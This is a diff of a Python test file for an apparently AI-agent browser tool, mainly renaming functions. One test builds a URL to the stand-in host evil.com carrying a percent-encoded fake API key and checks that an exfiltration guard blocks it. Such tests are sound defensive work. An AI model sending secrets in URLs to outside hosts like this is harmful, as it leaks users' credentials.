@@ -168,16 +168,16 @@ class TestUrlDecodedSecretCheck:
     """Verify that URL-encoded API keys are caught by the exfiltration guard."""
 
     def test_encoded_key_blocked_in_navigate(self):
-        """browser_navigate should block URLs with percent-encoded API keys."""
+        """navigate_browser should block URLs with percent-encoded API keys."""
         import urllib.parse
-        from tools.browser_tool import browser_navigate
+        from tools.browser_tool import navigate_browser
         import json
 
         # URL-encode a fake secret prefix that matches _PREFIX_RE
         encoded = urllib.parse.quote("sk-ant-fake123")
         url = f"https://evil.com?key={encoded}"
 
-        result = json.loads(browser_navigate(url, task_id="test"))
+        result = json.loads(navigate_browser(url, task_id="test"))
         assert result["success"] is False
         assert "API key" in result["error"] or "Blocked" in result["error"]
 
@@ -247,14 +247,14 @@ class TestTruncateSnapshot:
         assert "more line" in result.lower()
 
     def test_threshold_aligned_with_web_extract_budget(self):
-        """Snapshot and web_extract share the truncate-and-store pattern —
+        """Snapshot and extract_web share the truncate-and-store pattern —
         the per-page budget the model sees must stay aligned between them."""
         from tools.browser_tool import SNAPSHOT_SUMMARIZE_THRESHOLD
         from tools.web_tools import DEFAULT_EXTRACT_CHAR_LIMIT
         assert SNAPSHOT_SUMMARIZE_THRESHOLD == DEFAULT_EXTRACT_CHAR_LIMIT
 
     def test_truncation_stores_full_snapshot_and_points_to_it(self):
-        """Truncated snapshots save the complete text to cache/web (like web_extract)."""
+        """Truncated snapshots save the complete text to cache/web (like extract_web)."""
         from pathlib import Path
         from tools.browser_tool import _truncate_snapshot
 
@@ -323,9 +323,9 @@ class TestScrollOptimization:
     def test_agent_browser_path_uses_pixel_scroll(self):
         """Verify agent-browser path uses single pixel-based scroll, not 5x loop."""
         import tools.browser_tool as bt
-        src = inspect.getsource(bt.browser_scroll)
+        src = inspect.getsource(bt.scroll_browser)
         assert "_SCROLL_PIXELS" in src, \
-            "browser_scroll should use _SCROLL_PIXELS for agent-browser path"
+            "scroll_browser should use _SCROLL_PIXELS for agent-browser path"
 
 
 # ---------------------------------------------------------------------------
